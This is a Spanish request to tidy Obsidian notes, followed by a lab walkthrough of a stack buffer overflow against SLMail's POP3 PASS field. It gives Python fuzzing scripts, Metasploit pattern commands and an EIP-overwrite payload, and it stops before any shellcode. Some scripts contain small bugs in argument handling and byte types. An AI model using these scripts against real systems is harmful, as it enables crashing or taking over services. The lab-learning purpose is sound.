---
Tema: "[[Buffer Overflow]]"
---
Embellecé y organizá mis apuntes de hacking en Obsidian usando Markdown (encabezados, listas, callouts, tablas, mermaid, bloques de código).  
Simplificá lo confuso, agregá ejemplos de comandos/técnicas.  
Respetá enlaces e imágenes.  
Objetivo: notas claras, técnicas y atractivas.  

Aqui va el texto:

---

vamos a trabjar con un w7 de 32 bits home basic 
el enlace de descarga esta [aqui](https://archive.org/download/hi-tn-fi-nd.-com-windows-7-home-basic-32-bit-64-bit/_HiTnFiND.COM_Windows_7_Home_Basic_32Bit_64Bit.iso)
instalas en un hipervisor como VMARE o VIRTUALBOX
dentro de ese SO instalamos [[Inmunnity Debugger]] que esta solo para windows, esto requiere python y mona.py que lo puedes encontrar en este [repo](https://github.com/corelan/mona.git)
el codigo por si quieres hacer [[wget]]

 es este:
```bash
wget https://raw.githubusercontent.com/corelan/mona/refs/heads/master/mona.py
```

una vez instalado eso debemos [[Deshabilitar DEP en Windows 7]] esto es para que las instrucciones de memoria 
puedan ser ejecutadas en el stack mediante el shellcode y el dep es una proteccion

ese script de python hay que meterlo en C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands

tambien como en la fase de escaneo la maquina no devuelve nada puertos abiertos ni trazas ICMP, debemos deshabilitar el firewall de windows

y para que no se nos olvide lo hacemos asi:

vas a firewall y le das a turn off a todo

y tambien descargamos SLMail que es un servidor SMTP vulnerable a buffer overflow

este una vez instalado abre el puerto 25 y el 110 y el 110 es el vulnerable

si hacemos con [[searchsploit]]
```bash
searchsploit slmail 5.5
```

encontraremos scripts relacionados con un campo PASS que significa que un campo es vulnerable a buffer overflow

una vez configurado el SLMAIL y el inmunnity debugger y deshabilitado el firewall

reiniciamos y podemos ver que si nos conectamos con [[telnet]] al puerto 110 nos pide usuario y pass
```bash
telnet ipvictima  110
```


---

Fase INICIAL - Fuzzing y tomando el control del registro EIP 

la idea aqui es una vez tenemos que enfrentarnos  a un servicio primero hay que fuzzear todo lo que podamos para ver si hay algun buffer overflow

en este caso armaremos un script en python el cual estara en `red_vault/scripts/buffer_overflow/fuzzing_slmail.py` 

```python
import socket
import sys

IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio

buffer_length = int(sys.argv[2])  # < --  longitud del buffer para el campo password

def exploit():
    # creamos el socket que hace la conexion por TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    # recibimos el banner para ver si es SLMail
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    # enviamos el comando USER
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    # una vez obtenida la respuesta
    s.send(b"PASS " + b"A" * buffer_length + b"\r\n")
    # cerramos la conexion
    s.close()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP> <longitud_del_buffer>")
        exit(1)
```

en el caso de aplicar para la victima que es el servicio SLMAIL en el puerto 110 si le aplicamos con una longitud de 5000 bytes al campo PASS

vamos a tener un crash del servicio, y el registro EIP se llena de 41414141 que es la representacion en hexadecimal de la letra A, se llena de As porque el script envia 5000 As y el buffer overflow hace que se sobrescriba el EIP.
recordar que el registro EIP es el que contiene la direccion de memoria a la que se va a saltar cuando termine la funcion actual, si logramos controlar el EIP podemos redirigir el flujo de ejecucion del programa a donde queramos.

![[Pasted image 20251013220744.png]]

de esta forma hemos verificado que el servicio es vulnerable a buffer overflow y hemos tomado el control del registro EIP

ahora el objetivo es tener el control del registro EIP
CUANTAS A s hacen falta para llegar al EIP?

para eso usamos pattern_create.rb de metasploit que generalmente esta en /usr/share/metasploit-framework/tools/exploit/pattern_create.rb

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```
esto nos sirve para crear un patron de 5000 bytes que es lo que necesitamos para hacer el overflow y asi saber la longitud exacta para llegar al EIP (lo que tambien se conoce como offset)

ese patron es algo asi:
```plaintext
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4
```
si ahora usamos ese patron en el script de fuzzing en lugar de las As
```python
import socket
import sys
IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4"
def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    s.send(b"PASS " + payload + b"\r\n")
    s.close()
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
```

esto despues si vemos en [[Inmunnity Debugger]] el registro EIP tendra un valor como este **39654138** eso debemos anotarlo para despues pasarlo al pattern_offset.rb de metasploit que generalmente esta en /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x39654138
```
esto nos dira que la longitud exacta para llegar al EIP es 2606 bytes

es decir 2606 As hacen falta para llegar al EIP

ahora si en el script de fuzzing ponemos 2606 As y luego 4 Bs para llenar el EIP
```python
import socket
import sys
IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio
offset = 2606
before_eip = b"A" * 2606
eip = b"B" * 4
payload = before_eip + eip

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    s.send(b"PASS " + payload + b"\r\n")
    s.close()
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
```

y si ahora ejecutamos el script veremos que el registro EIP se llena de 42424242 que es la representacion en hexadecimal de la letra B 